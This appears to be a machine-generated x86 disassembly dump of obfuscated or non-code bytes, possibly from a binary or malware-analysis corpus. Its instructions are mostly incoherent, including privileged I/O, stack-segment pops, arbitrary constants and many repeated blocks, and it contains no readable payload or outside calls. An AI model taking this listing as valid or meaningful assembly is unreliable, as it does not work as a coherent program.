and bl [ edi ]
jpo r-xdata
xchg edx eax
xchg edx eax
mov [ ebp - 0x14147b7c ] 0x13
mov dh 0xb7
bsr ebp [ edx + edx * 4 ]
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_47737b
mov ecx 0x6fbd9279
jpo r-xdata
in al 0x87
jmp r-xdata
jpo r-xdata
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
jmp r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
test [ esi ] cl
ja r-xdata
pop ebp
jo r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
pop esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub ebx [ edi ]
jpo r-xdata
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
push cs
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
jpo r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
cmp al 0xbd
jpo r-xdata
jpo r-xdata
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
jpo r-xdata
jmp r-xdata
retn
jmp r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec ebx
and bl [ edi ]
jpo r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
aaa
jpo r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jmp r-xdata
jpe r-xdata
jmp r-xdata
test bl ch
jmp sub_4772dd
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jpo r-xdata
test bl ch
jmp sub_4773ef
jmp r-xdata
jmp r-xdata
sub_477384
adc [ eax ] ecx
sbb eax 0x929b2ef2
jmp r-xdata
jpo r-xdata
jmp r-xdata
div [ edi ]
pop edi
xor edx [ edx + 0x7b7b4d53 ]
jmp r-xdata
jmp r-xdata
test bl ch
jns r-xdata
pop ebp
jmp r-xdata
mov ebp 0xeb7b7b6f
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
test [ ebx ] ch
sub [ ebp + ebp + 0x488a926f ] al
jpo r-xdata
xchg edx eax
dec eax
je r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
jpo r-xdata
jmp sub_4773ef
je r-xdata
fwait
jmp r-xdata
jpo r-xdata
jmp r-xdata
retn
jmp r-xdata
xchg edx eax
jpo r-xdata
xchg edx eax
fwait
dec ebx
and bl [ edi ]
jpo r-xdata
jpe r-xdata
jmp r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
test [ esi ] cl
ja r-xdata
adc esi [ esi + 0x2cbd0fb7 ]
xchg edx eax
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jo r-xdata
jmp r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub ebx [ edi ]
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
xchg edx eax
xchg edi eax
push 0x7b
jpo r-xdata
xchg edx eax
mov [ ebp - 0x14147b7c ] 0x13
mov dh 0xb7
bsr ebp [ edx + edx * 4 ]
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
push cs
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
cmp al 0xbd
jpo r-xdata
jpo r-xdata
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
xchg [ esp + eax * 4 + 0x1d1211eb ] eax
xchg ebp eax
xchg edx eax
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jmp r-xdata
jmp r-xdata
jg r-xdata
xchg esi eax
push 0x7b
jpo r-xdata
test bl ch
adc [ edx ] edx
sbb eax 0x92953ef2
adc [ ebx + 0x22 ] ecx
pop ds
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jpo r-xdata
aaa
jpo r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
test bl ch
jmp sub_4772dd
sub_477395
xchg edx eax
jmp r-xdata
jpo r-xdata
jmp sub_4773ef
fwait
jmp r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
je r-xdata
fwait
jmp r-xdata
div [ edi ]
pop edi
xor edx [ edx + 0x7b7b4d53 ]
jmp r-xdata
jmp r-xdata
test bl ch
jns r-xdata
pop ebp
jmp r-xdata
mov ebp 0xeb7b7b6f
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
test [ ebx ] ch
sub [ ebp + ebp + 0x488a926f ] al
jpo r-xdata
dec eax
je r-xdata
xchg edx eax
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
retn
jmp r-xdata
xchg edx eax
jpo r-xdata
dec ebx
and bl [ edi ]
jpo r-xdata
jpe r-xdata
jmp r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
test [ esi ] cl
ja r-xdata
adc esi [ esi + 0x2cbd0fb7 ]
xchg edx eax
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jo r-xdata
jmp r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub ebx [ edi ]
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
xchg edx eax
xchg edi eax
push 0x7b
jpo r-xdata
xchg edx eax
mov [ ebp - 0x14147b7c ] 0x13
mov dh 0xb7
bsr ebp [ edx + edx * 4 ]
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
push cs
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
cmp al 0xbd
jpo r-xdata
jpo r-xdata
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
xchg [ esp + eax * 4 + 0x1d1211eb ] eax
xchg ebp eax
xchg edx eax
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jmp r-xdata
jmp r-xdata
jg r-xdata
xchg esi eax
push 0x7b
jpo r-xdata
test bl ch
adc [ edx ] edx
sbb eax 0x92953ef2
adc [ ebx + 0x22 ] ecx
pop ds
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jpo r-xdata
aaa
jpo r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
test bl ch
jmp sub_4772dd
sub_4773e9
add [ esp + esi * 2 - 0x7d0f4512 ] 0xffffff92
popad
jpe r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec ebx
and bl [ edi ]
jo r-xdata
jmp r-xdata
pop esi
jpo r-xdata
jpo r-xdata
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
retn
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_4773ef
adc [ edx + 0x7b7b7a61 ] 0xeb
jmp r-xdata
jpo r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
jpo r-xdata
jpo r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
jpo r-xdata
jmp r-xdata
retn
jmp r-xdata
dec ebx
and bl [ edi ]
jpo r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
test bl ch
jmp sub_4773ef
jmp r-xdata
jpo r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
pop ebp
sub_4773fb
xchg edi eax
xchg edx eax
in al 0x87
jpo r-xdata
jmp r-xdata
jmp r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
pop ebp
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
jpo r-xdata
jpo r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
jpo r-xdata
jmp r-xdata
retn
jmp r-xdata
dec ebx
and bl [ edi ]
jpo r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
test bl ch
jmp sub_4773ef
jmp r-xdata
jpo r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jmp r-xdata
jmp r-xdata
jpo r-xdata
sub_477428
sub eax 0x9c93bcf0
pop esi
jpo r-xdata
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
cmp al 0xbd
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jmp r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
pop ebp
jpo r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
jpo r-xdata
jpo r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
jpo r-xdata
jmp r-xdata
retn
jmp r-xdata
dec ebx
and bl [ edi ]
jpo r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
jmp sub_4773ef
sub_477464
pop esp
dec ecx
jpo r-xdata
jmp r-xdata
idiv [ esi ]
outsd
xchg edx eax
pop ss
outsd
jpo r-xdata
div [ ebx - 0x6c7b7b7a ]
into
pop ebx
jpo r-xdata
jmp r-xdata
jmp r-xdata
mov dl 0xb8
jmp r-xdata
xchg edx eax
loope r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
dec eax
push cs
mov ch 0x92
jpo r-xdata
std
pop eax
pop ebx
jpo r-xdata
dec eax
mov ebx 0xebb8b23b
jmp r-xdata
jmp r-xdata
or al 0x1a
xchg edx eax
sub [ ebp + 0x7b ] esp
jpo r-xdata
mov al [ 0x1daf3ef6 ]
dec edi
inc eax
jpo r-xdata
scasd [ edi ]
sbb eax 0x92b50ef2
xchg edx eax
or al 0x1a
mov edi 0x3ba6925b
jpo r-xdata
outsd
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
inc edi
js r-xdata
test [ edi + 0x78 ] 0xf8
mov bh 0x44
mov edi 0x1a0c362d
mov ebx 0x809dfe74
test [ esi + esi * 8 + 0x7b92b306 ] al
imul edi [ ebx + 0x7b ] 0xffffffeb
mov esp 0x362dbf3e
jmp r-xdata
pop ds
pop edi
add al 0x7f
jpo r-xdata
push es
mov bl 0x92
jmp r-xdata
xchg edx eax
pop edi
pop ecx
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
adc eax [ ebx - 0x6dcdbb49 ]
pop esp
sub eax 0xebeb7b7b
jmp r-xdata
jmp r-xdata
dec ebx
pop ebp
cmp al 0x7b
jpo r-xdata
jmp r-xdata
lodsd [ esi ]
dec eax
dec eax
mov ebx 0xb2202524
mov eax 0x92241311
add [ esp + eax * 4 - 0xd141415 ] 0x78bc8326
and esp [ edx ]
and ah [ edx ]
sbb eax 0xff74aa40
jpo r-xdata
cli
inc ebx
sub edi [ esi ]
jpo r-xdata
jpo r-xdata
popad
pop eax
jpo r-xdata
adc [ edx - 0x6e ] edi
hlt
jmp r-xdata
jmp r-xdata
xchg edx eax
jns r-xdata
r-xdata
jmp r-xdata
cmp [ ebx - 0x6e ] al
and al 0x3c
jpo r-xdata
xchg edx eax
sub edi [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jae r-xdata
je r-xdata
jmp r-xdata
jpo r-xdata
dec eax
mov dl 0x1d
r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
js r-xdata
adc [ ebx - 0x7c ] edi
sub esi [ edi ]
jmp r-xdata
inc edx
ja r-xdata
jpo r-xdata
jpo r-xdata
dec [ ebx + 0x5d ]
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
je r-xdata
int1
imul edx [ edx + 0x7b7b48ad ] 0xffffffeb
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
test [ ebx + 0x7b ] ebx
jpo r-xdata
sub eax 0x921a0c36
je r-xdata
jpo r-xdata
xchg [ esi + 0x7b ] bh
jpo r-xdata
pop ss
xchg edx eax
jmp r-xdata
inc [ esi ]
ja r-xdata
push es
js r-xdata
xchg edx eax
sub eax 0x2eb4921f
jpo r-xdata
outsb
fdivr st0
test [ ebx + 0x74 ] ebx
stc
xchg edx eax
test [ esp + eax * 4 - 0x6d78c17c ] al
lodsd [ esi ]
dec ecx
jpo r-xdata
mov ebx 0x922cb8b2
xlat
xchg edx eax
r-xdata
insb
jpo r-xdata
jpo r-xdata
jmp r-xdata
xchg eax esi
pop es
neg [ edi - 0x4a0f72b8 ]
jmp r-xdata
jpo r-xdata
push ebx
jno r-xdata
jpo r-xdata
inc ebp
push eax
jpo r-xdata
and ah [ edx ]
and bl [ 0xffffffffff74aa40 ]
jmp r-xdata
je r-xdata
xchg edx eax
jpo r-xdata
and dh dh
aas
pop edi
inc ebx
xchg edx eax
jo r-xdata
xchg edx eax
xchg edx eax
add [ esp + eax * 4 + 0x2bebebeb ] 0x7b6f9f92
jpo r-xdata
push ss
xor [ edi + 0x5c923244 ] 0x2d
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
lahf
jle r-xdata
test ch ch
xlat
jpo r-xdata
sbb eax 0x22b936f2
adc [ esi ] ecx
pop es
mov [ esp + eax * 4 - 0x14141415 ] es
adc ebx esi
jpo r-xdata
sbb eax 0x92b73ef2
adc [ esi ] edx
jmp r-xdata
test bl ch
jmp r-xdata
jmp r-xdata
xor dl [ edx + 0x7b7b2d5c ]
inc esp
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
jmp r-xdata
dec ebp
cmp [ ebx + 0x7b ] bh
adc [ 0x1d161123 ] ecx
mov bh 0x92

jmp r-xdata
sbb eax 0x929f3ef2
lea esi [ ebx + 0x7b ]
jpo r-xdata
xchg edi eax
sub ch [ eax ]
xchg edx eax
popfd
ja r-xdata
jpo r-xdata
mov edx [ edx + 0x7b7b6737 ]
jmp r-xdata
daa
pop edi
outsd
xchg ebx eax
jmp r-xdata
jpo r-xdata
push ebx
xchg edx eax
mov edx 0xeb7b7b42
jmp r-xdata
test [ esi ] cl
popfd
sbb eax 0x928b36f2
push edi
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
clc
inc edx
jpo r-xdata
jmp r-xdata
xchg ebx eax
or eax 0x927b7b65
sub esi esi
mov ebx 0x7b644992
jpo r-xdata
jpo r-xdata
xor [ ecx + 0x7b ] dl
jpo r-xdata
test [ ebx + ebp + 0x70938cf0 ] al
jg r-xdata
mov edx 0x7b64a192
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec ebp
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
jmp r-xdata
xchg edx eax
jge r-xdata
int3
mov ecx 0x920e1122
xchg eax edi
xchg [ edi + 0x74 ] edi
jmp r-xdata
push edi
jpo r-xdata
sbb eax 0xfe7b7b67
pop ebp
jpo r-xdata
xchg edx eax
jmp r-xdata
clc
lahf
cmp edx 0xffffff97
out dx eax
jg r-xdata
jmp r-xdata
cmp al 0xfe
mov ebx 0x399dfe74
jpo r-xdata
mov ebx 0x7b63ff74
jpo r-xdata
jpo r-xdata
jpo r-xdata
clc
pop es
pop edi
outsd
jpe r-xdata
jpo r-xdata
clc
sbb [ 0x21c52ef2 ] ebx
adc [ ebx - 0x7c ] edi
in eax dx
xlat
jmp r-xdata
idiv [ esi ]
cmpsd [ esi ] [ edi ]
sub esi eax
mov ebp 0x7b650d93
jpo r-xdata
jle r-xdata
aad 0x11
jpo r-xdata
xchg edx eax
xchg ebx eax
lds ecx [ ebp - 0x506d7b7c ]
cmp [ ebx + 0x7b ] edi
adc [ ebx ] 0x74
stc
push esi
push edi
jpo r-xdata
jpo r-xdata
jmp r-xdata
lodsd [ esi ]
pop ebx
jpo r-xdata
fist [ ecx + 0x7b ]
jpo r-xdata
adc al 0x92
jpo r-xdata
jpo r-xdata
inc [ esp + esi * 2 + 0x7b575efe ]
jpo r-xdata
adc [ edx + edx * 4 ] edx
pop ds
mov dl 0xb8
jmp r-xdata
mov ah 0x76
jpo r-xdata
jpo r-xdata
in eax 0x5b
jpo r-xdata
or [ 0xffffffff92c536f2 ] bl
sbb eax 0x20d726f2
sbb eax 0x11d526f2
jmp r-xdata
jpo r-xdata
xchg edx eax
sub esi esi
jmp r-xdata
pop ebx
sub bh [ ebx + 0x7b ]
jmp r-xdata
cmp [ ebx + 0x7b ] bh
jmp r-xdata
mov eax 0x117b7b7b
adc [ eax ] ebx
xchg ebx eax
fdiv [ ebx + edi * 2 ]
jpo r-xdata
jpo r-xdata
cmp [ ebx + 0x28 ] ch
clc
cmpsd [ esi ] [ edi ]
push 0x7b
jpo r-xdata
xchg edx eax
jmp r-xdata
xlat
sbb eax 0x21c72ef2
adc [ ecx ] ebx
sbb eax 0x21c52ef2
adc [ edi ] ebx
xchg edx eax
dec ecx
jpo r-xdata
jmp r-xdata
mov edi 0x47004277
test [ esi + edi * 8 + 0x5e ] dh
push edi
jpo r-xdata
xchg ebx eax
imul [ ebp + 0x7b ]
jmp r-xdata
popad
jpo r-xdata
jmp r-xdata
jmp r-xdata
je r-xdata
jpo r-xdata
daa
sub edi [ ebx + 0x7b ]
sub eax 0x7b6df793
mov edx 0x692d938b
jpo r-xdata
idiv [ eax ]
imul ebp [ eax ] 0xfffffff8
and [ edx + 0x7b7b4ce6 ] edx
add [ ebx + edi * 2 + 0x7b ] dh
jmp r-xdata
jpo r-xdata
jmp r-xdata
add [ edi + 0x74 ] al
jpo r-xdata
cwde
xchg edx eax
xlat
pushad
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
xchg edx eax
and al 0x7d
jpo r-xdata
std
xchg [ ebx + 0x7b ] edi
jpo r-xdata
test [ esi ] cl
jae r-xdata
idiv ah
jmp r-xdata
xchg edx eax
0x137b7b65 0x4996
jge r-xdata
xchg edx eax
add bh [ edx ]
jpo r-xdata
inc [ edi ]
adc [ edx + 0x7b7b60d7 ] 0xeb
jmp r-xdata
jpo r-xdata
shufps xmm3 [ edi + 0x26f0b248 ] 0x8f
dec edx
jpo r-xdata
sub dl dh
pop edi
je r-xdata
xchg [ esp + eax * 4 - 0x64c109d5 ] al
xchg edx eax
pop esi
insd
jpo r-xdata
sub eax [ esi + ecx + 0x7fef673 ]
int 0x54
jpo r-xdata
and ah ch
test [ edx + 0x7b7b84c2 ] al
jpo r-xdata
cld
outsd
r-xdata
cmp edi [ ebx + 0x7b ]
sbb eax 0x929f3ef2
cmp ecx [ edx + 0x7b ]
jpo r-xdata
jpo r-xdata
[ edi ]
clc
mov edi 0x6bbc9263
jpo r-xdata
je r-xdata
jle r-xdata
mov ebx 0x8858ff74
xchg edx eax
xlat
push esp
jpo r-xdata
xchg edx eax
jle r-xdata
mov eax 0x7b7d8992
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
fwait
jmp r-xdata
sbb eax 0x92b52ef2
jpo r-xdata
idiv [ esi ]
jpo r-xdata
test [ esp + ebp + 0xa6fcc74 ] al
test [ ecx ] 0xc4
jmp r-xdata
je r-xdata
jpo r-xdata
test [ esi ] cl
jae r-xdata
je r-xdata
std
jmp r-xdata
jmp r-xdata
xchg ebx eax
jmp r-xdata
cmp [ ebx + 0x7b ] 0x7b
xchg ebx eax
stosd [ edi ]
jpo r-xdata
std
xchg edx eax
shl [ ebx + 0x7b ] 0x1
jpo r-xdata
xchg ebx eax
loop r-xdata
movsb [ edi ] [ esi ]
r-xdata
mov ch 0x92
mov ebp 0x7b6b5f3f
inc edx
pop es
pop edi
dec edi
xchg ebx eax
cmpsd [ esi ] [ edi ]
sub [ edx + 0x7b7b4d5b ] dl
jmp r-xdata
clc
mov ecx 0x78cd925b
jpo r-xdata
fstp [ ebx + edi * 2 ]
jmp r-xdata
jpo r-xdata
mov edx 0xf87b7b64
mov edi 0x407df26f
jl r-xdata
retn
clc
test [ edx + 0x74 ] ah
cld
js r-xdata
add esp eax
jmp r-xdata
jpo r-xdata
stc
jne r-xdata
jpo r-xdata
sub al 0x84
sub eax 0x4d849273
jpo r-xdata
idiv [ edi ]
pop edi
aaa
xchg edx eax
inc esi
jpo r-xdata
jpo r-xdata
je r-xdata
test [ 0xffffffff8483f81f ] ch
jmp r-xdata
jpo r-xdata
mov ebx 0x7b3cf092
jpo r-xdata
test [ edx + 0x7b7b51ac ] edx
sbb eax 0x118f3ef2
daa
jmp r-xdata
jmp r-xdata
jpo r-xdata
fwait
xchg edx eax
fdiv [ esi + 0x7b ]
xchg edx eax
sti
xor [ ebx + 0x7b ] edi
jmp r-xdata
jpo r-xdata
jpo r-xdata
sbb eax 0xf0a526f2
mov eax [ 0xffffffff9b26f21d ]
xchg edx eax
les eax [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
jne r-xdata
idiv [ esi ]
sti
sub [ ebx ] ch
jpo r-xdata
jmp r-xdata
dec eax
je r-xdata
xchg [ esi ] edi
mov esi 0xeb84848e
jmp r-xdata
jmp r-xdata
mov dl 0xf0
and [ 0x11d526f2 ] bl
xlat
mov edx 0x696a9273
jpo r-xdata
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
clc
and eax 0x927b7b40
jmp r-xdata
test bl ch
jmp r-xdata
cmp eax 0x25f8747d
jpo r-xdata
xchg edx eax
sub al 0x81
test [ ebx + ebp * 8 - 0x7b141415 ] al
maxps xmm4 [ ebx - 0x6d ]
jpo r-xdata
mov esi ebx
fwait
stosd [ edi ]
[ eax - 0x78 ]
xchg [ edx - 0x7b7b76b7 ] edx
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b4e5a ] 0xffffffeb
xchg ebx eax
popfd
aas
jpo r-xdata
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x54c10de3 ] al
inc eax
jpo r-xdata
jmp r-xdata
cmp eax 0x67af936f
jpo r-xdata
jno r-xdata
xchg edx eax
xchg edx eax
jmp r-xdata
jmp r-xdata
jmp r-xdata
and [ edx + 0x7b7b55ba ] dl
adc [ eax ] ebx
fwait
jmp r-xdata
jge r-xdata
sbb eax 0x927b41f8
adc [ edx + 0x7b ] 0x7b
and bh dh
mov ebx 0x7b7fff74
jpo r-xdata
jns r-xdata
mov [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
adc edi edi
add [ ebp - 0x52 ] ah
sub al 0xf2
